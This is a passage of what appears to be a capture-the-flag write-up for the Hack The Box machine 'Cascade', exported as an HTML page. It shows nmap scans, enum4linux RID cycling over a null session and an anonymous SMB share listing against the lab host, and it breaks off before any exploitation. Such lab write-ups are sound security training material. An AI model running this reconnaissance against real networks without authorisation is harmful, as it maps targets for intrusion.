@@ -1,0 +1,2782 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Cascade - 10.10.10.182</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-default_background {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-transparentGray { background-color: rgba(227, 226, 224, 0); }
+.select-value-color-translucentGray { background-color: rgba(0, 0, 0, 0.06); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="18bd1b9f-8847-8058-a2eb-daeb113a943b" class="page sans"><header><h1 class="page-title">Cascade - 10.10.10.182</h1><p class="page-description"></p></header><div class="page-body"><h1 id="18bd1b9f-8847-816f-b767-fc6a26b4fd4d" class="">Information Gathering &amp; Enumeration</h1><h2 id="18bd1b9f-8847-81d8-9780-c0f23daf996d" class="">NMAP</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18bd1b9f-8847-8196-b693-d9f17f9f5d0b" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ sudo nmap -sS -p- --min-rate=5000 -T5 -n 10.10.10.182
+[sudo] password for drroot: 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-29 22:11 -05
+Nmap scan report for 10.10.10.182
+Host is up (0.11s latency).
+Not shown: 65520 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+49154/tcp open  unknown
+49155/tcp open  unknown
+49157/tcp open  unknown
+49158/tcp open  unknown
+49165/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 26.59 seconds
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18bd1b9f-8847-811f-befb-dc385327dd19" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ nmap -sVC -T5 -n 10.10.10.182 -p53,88,135,139,389,445,636,3268,3269,5985 -Pn
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-29 22:13 -05
+Nmap scan report for 10.10.10.182
+Host is up (0.11s latency).
+
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-30 03:13:57Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   2:1:0: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2025-01-30T03:14:05
+|_  start_date: 2025-01-30T03:03:44
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 56.18 seconds
+</code></pre><p id="18bd1b9f-8847-8188-8519-df321bdcff32" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18bd1b9f-8847-812e-b058-f901248c9b92" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ nmap --script vuln 10.10.10.182 -Pn                                       
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-29 22:13 -05
+Nmap scan report for 10.10.10.182
+Host is up (0.11s latency).
+Not shown: 986 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+636/tcp   open  ldapssl
+|_ssl-ccs-injection: No reply from server (TIMEOUT)
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+|_ssl-ccs-injection: No reply from server (TIMEOUT)
+49154/tcp open  unknown
+49155/tcp open  unknown
+49157/tcp open  unknown
+49158/tcp open  unknown
+49165/tcp open  unknown
+
+Host script results:
+|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
+|_smb-vuln-ms10-054: false
+|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
+
+Nmap done: 1 IP address (1 host up) scanned in 107.03 seconds
+
+                                                                </code></pre><p id="18bd1b9f-8847-816b-bf7c-db485e9259d2" class="">
+</p><h2 id="18bd1b9f-8847-81ba-9d0a-dbae0327e780" class="">SMB Enumeration → 445 port</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18bd1b9f-8847-81e8-a151-ecdc0cd615f5" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ enum4linux -r 10.10.10.182                           
+Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Jan 29 22:29:49 2025
+
+ =========================================( Target Information )=========================================
+
+Target ........... 10.10.10.182
+RID Range ........ 500-550,1000-1050
+Username ......... &#x27;&#x27;
+Password ......... &#x27;&#x27;
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ============================( Enumerating Workgroup/Domain on 10.10.10.182 )============================
+
+
+[E] Can&#x27;t find workgroup/domain
+
+
+
+ ===================================( Session Check on 10.10.10.182 )===================================
+
+
+[+] Server 10.10.10.182 allows sessions using username &#x27;&#x27;, password &#x27;&#x27;
+
+
+ ================================( Getting domain SID for 10.10.10.182 )================================
+
+Domain Name: CASCADE
+Domain Sid: S-1-5-21-3332504370-1206983947-1165150453
+
+[+] Host is part of a domain (not a workgroup)
+
+
+ ==================( Users on 10.10.10.182 via RID cycling (RIDS: 500-550,1000-1050) )==================
+
+
+[I] Found new SID: 
+S-1-5-21-3332504370-1206983947-1165150453
+
+[I] Found new SID: 
+S-1-5-21-2189247330-517467924-712900258
+
+[+] Enumerating users using SID S-1-5-21-2189247330-517467924-712900258 and logon username &#x27;&#x27;, password &#x27;&#x27;
+
+S-1-5-21-2189247330-517467924-712900258-500 CASC-DC1\Administrator (Local User)
+S-1-5-21-2189247330-517467924-712900258-501 CASC-DC1\Guest (Local User)
+S-1-5-21-2189247330-517467924-712900258-513 CASC-DC1\None (Domain Group)
+
+[+] Enumerating users using SID S-1-5-21-3332504370-1206983947-1165150453 and logon username &#x27;&#x27;, password &#x27;&#x27;
+
+S-1-5-21-3332504370-1206983947-1165150453-500 CASCADE\administrator (Local User)
+S-1-5-21-3332504370-1206983947-1165150453-501 CASCADE\CascGuest (Local User)
+S-1-5-21-3332504370-1206983947-1165150453-502 CASCADE\krbtgt (Local User)
+S-1-5-21-3332504370-1206983947-1165150453-512 CASCADE\Domain Admins (Domain Group)
+S-1-5-21-3332504370-1206983947-1165150453-513 CASCADE\Domain Users (Domain Group)
+S-1-5-21-3332504370-1206983947-1165150453-514 CASCADE\Domain Guests (Domain Group)
+S-1-5-21-3332504370-1206983947-1165150453-515 CASCADE\Domain Computers (Domain Group)
+S-1-5-21-3332504370-1206983947-1165150453-516 CASCADE\Domain Controllers (Domain Group)
+S-1-5-21-3332504370-1206983947-1165150453-517 CASCADE\Cert Publishers (Local Group)
+S-1-5-21-3332504370-1206983947-1165150453-518 CASCADE\Schema Admins (Domain Group)
+S-1-5-21-3332504370-1206983947-1165150453-519 CASCADE\Enterprise Admins (Domain Group)
+S-1-5-21-3332504370-1206983947-1165150453-520 CASCADE\Group Policy Creator Owners (Domain Group)
+S-1-5-21-3332504370-1206983947-1165150453-521 CASCADE\Read-only Domain Controllers (Domain Group)
+S-1-5-21-3332504370-1206983947-1165150453-1001 CASCADE\CASC-DC1$ (Local User)
+
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18bd1b9f-8847-81b8-b35c-dc922808f26f" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ smbclient -L 10.10.10.182       
+Password for [WORKGROUP\drroot]:
+Anonymous login successful
+
+	Sharename       Type      Comment
+	---------       ----      -------
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.10.182 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+                     
+
